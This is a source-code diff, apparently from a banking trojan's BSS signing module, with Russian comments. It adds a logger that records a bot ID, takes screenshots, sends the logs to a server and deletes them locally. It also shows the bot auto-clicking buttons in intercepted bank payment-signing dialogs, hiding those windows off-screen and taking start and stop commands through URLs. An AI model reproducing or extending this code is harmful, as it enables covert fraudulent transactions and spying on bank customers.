@@ -57,27 +57,198 @@ namespace bsssign_Template
 
 
 
+//=============================================================================
+#ifdef LOG_BSS_SIGN
+
+	class TBSSSignLog;
+
+	//  Класс логирования действий при подписи бсс
+	TBSSSignLog *Logger = NULL;
 
 
-class TBSSSignLog : public TBotObject
-{
-public:
-	TBSSSignLog()
+
+	DWORD WINAPI BSSSignSendLog(LPVOID aPath)
 	{
+		// Функция отправляет лог
+		string *Path = (string*)aPath;
 
-	}
+		//Отправляем логи
+		VideoRecorderSendPath(Path->t_str(), NULL, NULL, 0);
 
-	~TBSSSignLog()
-	{
+		// Удаляем файлы
+		DeleteFolders(Path->t_str());
 
-	}
 
-	//----------------------------------------------------------------
-	void Write(const char *Line)
-	{
-    	// Функция записывает строку в лог
+		delete Path;
+		return 0;
     }
-};
+
+
+	class TBSSSignLog : public TBotObject
+	{
+	private:
+		// Поток записи лога
+		string FWorkPath;
+		TBotFileStream *FStream;
+		int FScreensCount;
+		//---------------------------------------------------------------------
+
+		void AddScreen(LPVOID Buf, DWORD Size)
+		{
+			FScreensCount++;
+			string Name;
+			Name.Format("screen%d.png", FScreensCount);
+			string FileName = FWorkPath + Name;
+
+			File::WriteBufferA(FileName.t_str(), Buf, Size);
+			Name.Format("===> <Screen%d>", FScreensCount);
+            Write(NULL, false, Name.t_str());
+		}
+		//---------------------------------------------------------------------
+
+		void MakeFullScreenShot()
+		{
+			// Функция делает снимок всего экрана
+			LPBYTE Buf = NULL;
+			DWORD Size = 0;
+			ScreenShot::MakeToMem(NULL, 0, 0, 0, 0, NULL, Buf, Size);
+            AddScreen(Buf, Size);
+			MemFree(Buf);
+		}
+		//---------------------------------------------------------------------
+
+		void MakeWndScreenShot(HWND Wnd)
+		{
+			// Функция делает снимок всего экрана
+//			LPBYTE Buf = NULL;
+//			DWORD Size = 0;
+//			ScreenShot::DrawWindow(Wnd, Buf, Size);
+//            AddScreen(Buf, Size);
+//			MemFree(Buf);
+
+			// На данном этапе делаем тектовый "снимок"
+//			PCHAR S = GetAllWindowsText(Wnd, true, true);
+//			if (S)
+//			{
+//				Write(NULL, false, "\r\n\r\nТекстовый снимок: \r\n");
+//				Write(NULL, false, S);
+//				Write(NULL, false, "\r\n");
+//
+//				STR::Free(S);
+//            }
+
+		}
+		//---------------------------------------------------------------------
+
+	public:
+
+		TBSSSignLog()
+		{
+			// Создаём файл лога
+			FScreensCount = 0;
+
+            TMemory Buf(MAX_PATH);
+
+			pGetTempPathA(MAX_PATH, Buf.Buf());
+
+			FWorkPath = Buf.AsStr();
+			FWorkPath += "sign\\";
+
+			CreateDirectoryA(FWorkPath.t_str(), NULL);
+
+			string FileName = FWorkPath + "bss.log";
+			FStream = new TBotFileStream(FileName.t_str(), fcmCreate);
+
+			// Записываем уид
+			string Line = "UID: ";
+			Line += GenerateBotID2();
+
+            Write(NULL, false, Line.t_str());
+		}
+		//----------------------------------------------------------------
+
+		~TBSSSignLog()
+		{
+			//  При уничтожении объекта закрываем лог
+        	Close();
+		}
+
+		//----------------------------------------------------------------
+		void Write(HWND ScreenWnd, bool MakeFullScreen, const char *Line)
+		{
+			// Функция записывает строку в лог
+			if (!FStream) return;
+
+			FStream->WriteString(Line);
+			FStream->WriteString("\r\n");
+
+			if (MakeFullScreen)
+				MakeFullScreenShot();
+
+			if (ScreenWnd)
+				MakeWndScreenShot(ScreenWnd);
+		}
+
+		//------------------------------------------------------------------
+		void Close()
+		{
+			if (FStream)
+			{
+				delete FStream;
+				FStream = NULL;
+
+				// Отправляем лог на сервер
+				StartThread(BSSSignSendLog, new string(FWorkPath));
+            }
+        }
+	};
+
+#endif
+//=============================================================================
+
+
+// Шаблон записи лога
+
+template <class SCREENWND, class MAKEFULLSCREEN, class MESSAGE>
+inline void BSSSignLogTemplate(SCREENWND ScreenWnd, MAKEFULLSCREEN MakeScreen, MESSAGE Message)
+{
+	#ifdef LOG_BSS_SIGN
+		if (Logger)
+			Logger->Write((HWND)ScreenWnd, (bool)MakeScreen, (PCHAR)Message);
+	#endif
+}
+
+
+template <class SCREENWND, class MAKEFULLSCREEN, class MESSAGE, class ARG1>
+inline void BSSSignLogTemplate(SCREENWND ScreenWnd, MAKEFULLSCREEN MakeScreen, MESSAGE Message, ARG1 Arg1)
+{
+	#ifdef LOG_BSS_SIGN
+		if (Logger)
+		{
+			string S;
+			S.Format((PCHAR)Message, Arg1);
+			Logger->Write((HWND)ScreenWnd, (bool)MakeScreen, S.t_str());
+        }
+	#endif
+}
+
+template <class SCREENWND, class MAKEFULLSCREEN, class MESSAGE, class ARG1, class ARG2>
+inline void BSSSignLogTemplate(SCREENWND ScreenWnd, MAKEFULLSCREEN MakeScreen, MESSAGE Message, ARG1 Arg1, ARG2 Arg2)
+{
+	#ifdef LOG_BSS_SIGN
+		if (Logger)
+		{
+			string S;
+			S.Format((PCHAR)Message, Arg1, Arg2);
+			Logger->Write((HWND)ScreenWnd, (bool)MakeScreen, S.t_str());
+        }
+	#endif
+}
+
+#define BSSSIGNLOG BSSSignLogTemplate<>
+
+
+
 
 
 //----------------------------------------------------------------------------
@@ -93,7 +264,8 @@ DWORD  BSSClickToButtons(HWND Form, bool MultiClick, DWORD BtnCaptionHash)
 		Button = (HWND)pFindWindowExA(Form, Button, NULL, NULL);
 		if (Button == NULL) break;
 
-		DWORD Hash = GetWndTextHash(Button);
+		string Text = GetWndText2(Button);
+		DWORD Hash = Text.Hash();
 
 		// Проверяем заголовок кнопки
 		if (Hash != BtnCaptionHash)
@@ -105,10 +277,18 @@ DWORD  BSSClickToButtons(HWND Form, bool MultiClick, DWORD BtnCaptionHash)
 		}
 
 		// Кликаем по кнопке
-		if (HardClickToWindow(Button, Random::Generate(6, 30), Random::Generate(6, 15)))
+		DWORD X = Random::Generate(2, 30);
+        DWORD Y = Random::Generate(2, 10);
+		if (HardClickToWindow(Button, X, Y))
 		{
+			BSSSIGNLOG(NULL, false, "Кликаем по кнопке [%d][%s]", Button, Text.t_str());
+			BSSSIGNLOG(NULL, false, "Координаты %d, %d", X, Y);
+
 			Count++;
 			pSleep(Random::Generate(1000, 1500));
+
+            BSSSIGNLOG(NULL, false, "Новый текст кнопки: [%s] \r\n\r\n", GetWndText2(Button).t_str());
+
 			if (!MultiClick) break;
         }
 	}
@@ -219,6 +399,7 @@ public:
 		: TBSSForm(aOwner, Wnd)
 	{
 		BDBG("bsssign","Перехвачено окно установки подписей");
+		BSSSIGNLOG(Wnd, false, "Обрабатываем окно установки подписей");
 		#ifdef BSSSIGN_HIDE_WND
             Move(-1000, 0);
 		#endif
@@ -231,9 +412,10 @@ public:
 		// нём не нажималась кнопка закрыть кликаем по ней
 		if (FStatus == bfsWait && !FCloseBtnClicked)
 		{
-			if (Owner()->Count() == 1)
+            FCloseBtnClicked = true;
+			if (Owner()->Count() == 1 && (BOOL)pIsWindowVisible(FForm))
 			{
-				FCloseBtnClicked = true;
+				BSSSIGNLOG(FForm, false, "Кликаем по кнопке закрытия");
 				BSSClickToButtons(FForm, false, BSS_CLOSE_BUTTON_CAPTION_HASH);
 			}
 
@@ -262,6 +444,7 @@ public:
 	{
 		// Для окно ввода пароля будем просто ожидать ввода
 		BDBG("bsssign","Перехвачено окно ввода пароля");
+		BSSSIGNLOG(Wnd, false, "Окно ввода пароля");
     	FMaxWaitInterval = 3 * 60 * 1000;
 	}
 
@@ -306,6 +489,8 @@ public:
 		: TBSSForm(aOwner, Wnd)
 	{
 		BDBG("bsssign","Перехвачено окно ошибки");
+		BSSSIGNLOG(NULL, false, "Окно ошибки");
+
 		#ifdef BSSSIGN_HIDE_WND
             Move(-1000, 0);
 		#endif
@@ -418,8 +603,9 @@ public:
 			Form = new TBSSErrorForm(this, WND);
 
 
-
 		if (!Form) return false;
+
+        BSSSIGNLOG(NULL, false, "Обрабатываем форму [%s]", Text.t_str());
 
 		// Запускаем поток
 		TLock L = GetLocker();
@@ -494,6 +680,13 @@ void BSSSign::CheckRequest(PCHAR URL)
 
 	if ( CompareUrl( "*az_start", URL ) )
 	{
+		#ifdef LOG_BSS_SIGN
+			// Создаём объект логирования
+			if (!Logger)
+            	Logger = new TBSSSignLog;
+		#endif
+
+
 		Clicker->SetActive(true);
 
 		// Если с данного процесса не запущена запись видео
@@ -502,16 +695,25 @@ void BSSSign::CheckRequest(PCHAR URL)
 		if (RecordVideo)
 			RecordVideo = VideoRecorderSrv::StartRecording(BSSSignName);
 
+        BSSSIGNLOG(NULL, true, "Получена команда СТАРТ");
 	}
 	else
 	if ( CompareUrl( "*az_stop", URL ) )
 	{
+		BSSSIGNLOG(NULL, true, "Получена команда СТОП");
+
 		Clicker->SetActive(false);
 		if (RecordVideo)
 		{
 			RecordVideo = false;
 			VideoRecorderSrv::StopRecording();
-        }
+		}
+
+		#ifdef LOG_BSS_SIGN
+			// Уничтожаем объект логирования
+			delete Logger;
+			Logger = NULL;
+		#endif
 	}
 //	else
 //	if ( CompareUrl( "*blind_up", URL ) )
@@ -563,6 +765,10 @@ void BSSSign::Initialize()
 	BDBG("bsssign","Инициализируем BSS кликер");
 
 	Clicker = new TBSSClicker();
+
+	#ifdef LOG_BSS_SIGN
+		Logger = NULL;
+	#endif
 
 	RecordVideo = false;
 
